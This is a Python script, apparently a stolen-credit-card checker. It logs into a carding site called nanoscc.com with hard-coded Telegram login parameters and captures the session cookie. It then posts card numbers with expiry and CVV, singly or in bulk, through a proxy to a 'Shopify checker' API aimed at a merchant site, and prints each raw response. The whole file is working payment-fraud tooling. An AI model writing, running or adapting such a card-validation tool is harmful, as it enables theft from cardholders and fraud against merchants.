import requests, urllib.parse

session = requests.Session()

params = {
    "id": "7756457768",
    "first_name": "Basic Coders",
    "username": "ccnHater",
    "photo_url": "https://t.me/i/userpic/320/gZCaCmp849XCd6JZPG80ZBovTIvoPpAH3UiBIMDxrEDtK18BJBNqOjjAhCnYzKNU.jpg",
    "auth_date": "1763557531",
    "hash": "cab720e9e94bf3af1d76413d23ff84a5db6f541ef25b45d05f287ffca52b3e67"
}

login_url = "https://nanoscc.com/telegram_login.php?" + urllib.parse.urlencode(params)
session.get(login_url)
phpsessid = session.cookies.get("PHPSESSID")
print("Hey Nano", phpsessid)

api_url = "https://nanoscc.com/api/shopify_checker.php"

headers = {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://nanoscc.com",
    "referer": "https://nanoscc.com/checkers/shopify.php",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K)"
}

print("\nBASIC CODERS — NANO FUCKED\n")

sites = "https://voyafly.com"
proxy = "TITS.OOPS.WTF:6969:asyncio:requests"

print("\n[1] Single Check")
print("[2] Mass Check\n")

mode = input("👉 Enter mode (1 or 2): ").strip()

cards = []

if mode == "1":
    cc = input("\n💳 Enter card (number|mm|yy|cvv): ").strip()
    cards.append(cc)

elif mode == "2":
    print("\n💳 Drop cards (type 'done' to start):\n")
    while True:
        line = input("→ ")
        if line.lower() == "done":
            break
        if line.strip():
            cards.append(line.strip())

else:
    print("❌ Invalid option")
    exit()

print("\n🚀 Checking Started...\n")

for card in cards:
    data = {
        "card": card,
        "sites": sites,
        "proxy": proxy
    }
    r = session.post(api_url, headers=headers, data=data)
    print("═══════════════════════════════════")
    print("💳 CARD:", card)
    print("🔍 RAW RESPONSE:")
    print(r.text)
    print("═══════════════════════════════════\n")
